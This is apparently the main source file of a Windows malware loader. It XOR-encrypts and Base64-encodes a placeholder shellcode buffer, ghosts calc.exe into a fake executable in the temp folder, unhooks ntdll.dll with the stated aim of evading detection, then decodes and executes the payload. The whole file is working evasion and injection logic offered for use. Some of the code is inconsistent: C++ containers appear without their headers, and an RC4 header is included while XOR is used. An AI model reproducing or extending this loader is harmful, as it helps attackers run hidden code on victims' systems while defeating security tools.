#include <windows.h>
#include <shlobj.h>
#include <stdio.h>
#include "ProcessCreation.h"
#include "PayloadInjection.h"
#include "RC4Encryption.h"
#include "Syscalls.h"
#include "Hollowing.h"
#include "Ghosting.h"
#include "AdvancedEncryption.h"
#include "Base64Utils.h"  // Add this include

// Main function logic
int main() {
    HANDLE hProcess = NULL, hThread = NULL;
    SyscallStruct St;

    // Initialize syscalls
    if (!InitializeSyscallStruct(&St)) {
        printf("[!] Could Not Initialize Syscalls\n");
        return -1;
    }

    // Step 1: Define the payload and XOR encryption key
    printf("[*] Defining payload and encryption key...\n");
    unsigned char payload[] = {
        // Your shellcode goes here
    };
    unsigned char key[] = { 0x11, 0x22, 0x33, 0x44 };  // Example key

    // Step 2: XOR encrypt the payload and then Base64 encode it
    printf("[*] Encrypting payload with XOR and Base64 encoding...\n");
    XOREncrypt(payload, sizeof(payload), key, sizeof(key));
    std::string encoded_payload = Base64Encode(payload, sizeof(payload));
    printf("[+] Payload encrypted and encoded successfully.\n");

    // Dynamically retrieve temp path for the fake executable
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    strcat(tempPath, "fake_calc.exe");  // Creating fake executable path in temp folder

    printf("Fake executable will be created at: %s\n", tempPath);

    // Step 3: Perform Process Ghosting (ghost calc.exe)
    printf("[*] Ghosting process (calc.exe)...\n");
    if (!ProcessGhosting("C:\\Windows\\System32\\calc.exe", tempPath, &St, &hProcess, &hThread)) {
        printf("[!] Process ghosting failed.\n");
        return -1;
    }

    printf("[+] Process ghosted successfully.\n");

    // Check if the process and thread handles are valid before proceeding
    if (hProcess == NULL || hThread == NULL) {
        printf("[!] Invalid process or thread handle.\n");
        return -1;
    }

    // Optional: Unhook ntdll.dll to evade detection (if required)
    printf("[*] Unhooking ntdll.dll...\n");
    if (!UnhookDLL(hProcess, &St)) {
        printf("[!] Failed to unhook ntdll.dll.\n");
        return -1;
    }

    // Step 4: Decode the payload and execute it
    std::vector<unsigned char> decoded_payload = Base64Decode(encoded_payload);
    LoadAndExecutePayload(decoded_payload.data(), decoded_payload.size(), key, sizeof(key));

    // Step 5: Resume the thread to execute the payload
    printf("[*] Resuming the thread to execute the payload...\n");
    ResumeThread(hThread);
    printf("[+] Thread resumed, payload should now execute.\n");

    // Close handles after use
    CloseHandle(hProcess);
    CloseHandle(hThread);

    return 0;
}
